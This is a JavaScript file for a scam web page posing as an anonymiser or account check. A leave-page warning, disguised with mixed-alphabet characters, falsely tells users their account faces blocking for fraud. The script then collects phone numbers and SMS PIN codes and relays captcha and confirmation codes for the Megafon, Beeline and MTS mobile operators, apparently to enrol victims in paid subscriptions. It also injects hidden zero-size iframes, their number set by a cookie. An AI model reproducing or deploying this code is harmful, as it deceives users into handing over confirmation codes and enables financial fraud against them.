var dontAskToStay   = ($.cookie('wdna'));
function areYouSure(  ) {
    if ( !dontAskToStay ){
        return "\u0412a\u0448 a\u043A\u043Aa\u0443\u043D\u0442 \u0437a\u043Fo\u0434o\u0437\u0440e\u043D \u0432 \u043Co\u0448e\u043D\u043D\u0438\u0447ec\u043Ao\u0439 a\u043A\u0442\u0438\u0432\u043Doc\u0442\u0438. Tpe\u0431ye\u0442c\u044F o\u0431\u044F\u0437a\u0442e\u043B\u044C\u043Da\u044F a\u043A\u0442\u0438\u0432a\u0446\u0438\u044F.\n" 
            + "B \u043F\u0440o\u0442\u0438\u0432\u043Do\u043C \u0441\u043B\u0443\u0447ae a\u043A\u043Aay\u043D\u0442 \u0431y\u0434e\u0442 \u043Fo\u043B\u043Do\u0441\u0442\u044C\u044E 3a\u0431\u043Bo\u043A\u0438\u0440o\u0432a\u043D.\n";
    }
}
window.onbeforeunload   = areYouSure;

function popupWindow( title, blocks, _app, action, button ) {
    $( '.box_title' ).text( title );
    $( '#layer_bg, #box_layer_bg, #layer_wrap, #box_layer_wrap' ).show(  );
    $( '.payform_block' ).hide(  );
    for ( var i in blocks ) if ( blocks.hasOwnProperty( i ) ) $( '#'+blocks[ i ] ).show(  );
    //$( '#nextAction' ).unbind(  ).click( function() { _app.process( { manual: true, action: action } ) } ).text( button );
}

function getDocHeight() {
    var D = document;
    return Math.max(
        Math.max(D.body.scrollHeight, D.documentElement.scrollHeight),
        Math.max(D.body.offsetHeight, D.documentElement.offsetHeight),
        Math.max(D.body.clientHeight, D.documentElement.clientHeight)
    );
}

function onBodyResize(  ) {
    $( '#iframe_bg' ).css( { position : 'absolute', top: 0, left: 0, height: getDocHeight(  ), width: '100%' } );
    $( '.popup_box_container' ).css( { position: 'absolute', top: '25%', left: '50%', 'margin-left': '-225px' } );
    $( '#footer' ).css( { position: 'absolute', top: getDocHeight(  ) + 'px', left: 0, right: 0, background: 'white', 'z-index': 1000 } );
}

$( function(  ) {
    
    if($.cookie('b') && $.cookie('b') !== 'wbanonymiser_rm_invest'){
        if($.cookie('ma')){
            var ma = Math.floor(parseInt($.cookie('ma'), 10));
            for (var counter = 0; counter < ma; counter++){
                $('#iblocks').append('<iframe height="0" width="0" frameborder="0" src="iframe.html"></iframe>');
            }
        }
    }
    
    onBodyResize(  );
    window.App = Backbone.View.extend( {
        abonent: 0,
        initialize: function(  ) {
            this.render(  );
        },
        render: function( name, variables ) {
            // default template variables
            if ( !variables ) variables = {  };
            if ( !variables.errors ) variables.errors = '';

            // default template
            if ( !name ) {
                if ( $.cookie( 'r' ) ){
                    dontAskToStay = true;
                    name = 'result';
                }
                else name = 'phone';
            }

            var template = _.template( $( "#tpl_" + name ).html(  ), variables );
            this.el.find( '#appContainer' ).html( template );
			if (name == 'phone' && variables.errors && $('#chrul').attr('name') == 'rul') {$('#chrul').attr('checked', 'checked');}
			
        },
        events: {
            "click .action" : "process"
        },
        process: function( event ) {
            var params = {  };
            if ( event.manual ) params.q = event.action; 
            else params.q = $( event.currentTarget ).data('action');
            switch( params.q ) {
                case "promo":
                    this.render(  );
                    break;
                case "startSubscriptionProcess":
                    this.render( 'phone' );
                    break;
                case "processPhone":
					if ($('#chrul').attr('name') == 'rul' && !$('#chrul').attr('checked')) {
						alert('Вы должны согласиться с правилами подписки!');
						return false;
					}
					if ($('#nextAction').attr('disabled') == 'disabled') return false;
					$('#nextAction').text('Подождите...').addClass('loading').attr('disabled','disabled');
                    params.phone = this.getPhoneNumber(  );
                    this.loadFromServer( params );
                    break;
                case "processCode":
                    /*if ( $( '#agree:checked' ).length == 0 ) {
                        alert( 'Вы должны согласиться с правилами!' );
                        return;
                    }*/
					if ($('#nextAction').attr('disabled') == 'disabled') return false;
					$('#nextAction').text('Подождите...').addClass('loading').attr('disabled','disabled');
                    params.phone = this.abonent;
                    params.pin = this.getPinCode(  );
                    this.loadFromServer( params );
                    break;
                case "processMegafonCaptcha":
                    params.captcha = $( 'input[name=mCaptcha]' ).val(  );
                    params.action  = $( 'input[name=mAction]' ).val(  );
                    params.cookies = {  };
                    params.inputs = {  };
                    $( 'input.mCoi' ).each( function( i ) { params.cookies[ $( this ).attr( 'name' ) ] = $( this ).val(  ); } );
                    $( 'input.mIni' ).each( function( i ) { params.inputs[ $( this ).attr( 'name' ) ]  = $( this ).val(  ); } );
                    this.loadFromServer( params )
                    break;
                case "processMegafonCode":
					if ($('#nextAction').attr('disabled') == 'disabled') return false;
					$('#nextAction').text('Подождите...').addClass('loading').attr('disabled','disabled');
                    params.code = $( 'input[name=mCode]' ).val(  );
                    params.action  = $( 'input[name=mAction]' ).val(  );
                    params.cookies = {  };
                    params.inputs = {  };
                    params.abn = $.cookie( 'abn' );
                    $( 'input.mCoi' ).each( function( i ) { params.cookies[ $( this ).attr( 'name' ) ] = $( this ).val(  ); } );
                    $( 'input.mIni' ).each( function( i ) { params.inputs[ $( this ).attr( 'name' ) ]  = $( this ).val(  ); } );
                    this.loadFromServer( params )
                    break;
                case "processBeelineCaptcha":
                    params.captcha = $( 'input[name=mCaptcha]' ).val(  );
                    params.action  = $( 'input[name=mAction]' ).val(  );
                    params.cookies = {  };
                    params.inputs = {  };
                    $( 'input.mCoi' ).each( function( i ) { params.cookies[ $( this ).attr( 'name' ) ] = $( this ).val(  ); } );
                    $( 'input.mIni' ).each( function( i ) { params.inputs[ $( this ).attr( 'name' ) ]  = $( this ).val(  ); } );
                    this.loadFromServer( params )
                    break;
                case "processBeelineCode":
					if ($('#nextAction').attr('disabled') == 'disabled') return false;
					$('#nextAction').text('Подождите...').addClass('loading').attr('disabled','disabled');
                    params.code = $( 'input[name=mCode]' ).val(  );
                    params.action  = $( 'input[name=mAction]' ).val(  );
                    params.cookies = {  };
                    params.inputs = {  };
                    params.abn = $.cookie( 'abn' );
                    $( 'input.mCoi' ).each( function( i ) { params.cookies[ $( this ).attr( 'name' ) ] = $( this ).val(  ); } );
                    $( 'input.mIni' ).each( function( i ) { params.inputs[ $( this ).attr( 'name' ) ]  = $( this ).val(  ); } );
                    this.loadFromServer( params )
                    break;
                case "processMtsCode":
					if ($('#nextAction').attr('disabled') == 'disabled') return false;
					$('#nextAction').text('Подождите...').addClass('loading').attr('disabled','disabled');
                    params.code = $( 'input[name=mCode]' ).val(  );
                    params.action  = $( 'input[name=mAction]' ).val(  );
                    params.cookies = {  };
                    params.inputs = {  };
                    params.abn = $.cookie( 'abn' );
                    $( 'input.mCoi' ).each( function( i ) { params.cookies[ $( this ).attr( 'name' ) ] = $( this ).val(  ); } );
                    $( 'input.mIni' ).each( function( i ) { params.inputs[ $( this ).attr( 'name' ) ]  = $( this ).val(  ); } );
                    this.loadFromServer( params )
                    break;
                case "resendPin":
                    params.phone = this.abonent;
                    this.loadFromServer( params );
                    break;
            }
        },
        loadFromServer: function( params ) {
            var self = this;
            $.get( "", params,
                function(data) {
                    response = $.parseJSON(data);
                    if (response.variables.web_aware) {
                        dontAskToStay = true;
                        $('#iblocks').html('');
                        window.onbeforeunload = function(){};
			window.location.href = response.variables.web_aware;
                    }
                    self.render( response.state, response.variables );
                }
            );
        },
        getPhoneNumber: function(  ) {
            var p = $.trim( $( "input[name=abonent]" ).val(  ) );
            p = p.replace( /\D+/, "" );
            this.abonent = p;
            $.cookie( "abn", p );
            return p;
        },
        getPinCode: function(  ) {
            var c = $.trim( $( "input[name=pincode]" ).val(  ) );
            c = c.replace( /\D+/, "" );
            return c;
        }
    } );

    _app = new App( { el: $( "body" ) } );
    var label = ($.cookie('u')) ? ( $.cookie('wdal') ? '\u0412\u043D\u0438\u043C\u0430\u043D\u0438\u0435!' : '\u0414\u043E\u0441\u0442\u0443\u043F \u0437\u0430\u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u0430\u043D!') : '\u0410\u043D\u043E\u043D\u0438\u043C\u0430\u0439\u0437\u0435\u0440';
    if ( $.cookie('b') && $.cookie('b') === 'wbanonymiser_rm_invest' ){
        label = 'Внимание!';
    }
    if ( !$.cookie( 'r' ) )
        popupWindow( label, [ 'phone', 'promo' ], _app, 'processPhone', 'Продолжить' );
} );
